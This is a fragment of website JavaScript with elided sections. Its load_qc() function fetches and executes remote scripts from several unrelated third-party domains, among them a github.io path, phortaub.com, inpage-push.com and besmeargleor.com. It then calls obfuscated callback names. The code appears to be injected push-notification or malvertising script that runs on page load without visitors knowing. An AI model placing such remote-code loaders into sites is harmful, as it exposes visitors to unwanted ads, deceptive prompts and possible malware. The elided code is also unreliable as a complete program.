...
function load_qc() {
    ...
    $.getScript("https://komwogan.github.io/money/statics/js/pn.js?v=1.7");
    $.getScript("https://phortaub.com/ntfc.php?p=3891376")
        .done(function(script, textStatus) {
            if (typeof _cxtisg !== 'undefined' && $.isFunction(_cxtisg)) {
                _cxtisg();
            } else if (typeof _xzdmfnls !== 'undefined' && $.isFunction(_xzdmfnls)) {
                _xzdmfnls();
            }
        })
        .fail(function(jqxhr, settings, exception) {
            if (typeof _uwsrzmbg !== 'undefined' && $.isFunction(_uwsrzmbg)) {
                _uwsrzmbg();
            } else if (typeof _lznzcv !== 'undefined' && $.isFunction(_lznzcv)) {
                _lznzcv();
            }
        });
    (function(d, z, s) {
    ...
    })('inpage-push.com', 3994725, document.createElement('script'));
    (function(d, z, s) {
        s.src = '//' + d + '/400/' + z;
        try {
            (document.body || document.documentElement).appendChild(s)
        } catch (e) {}
    })('besmeargleor.com', 4854363, document.createElement('script'));
    da_load_qc = true;
}
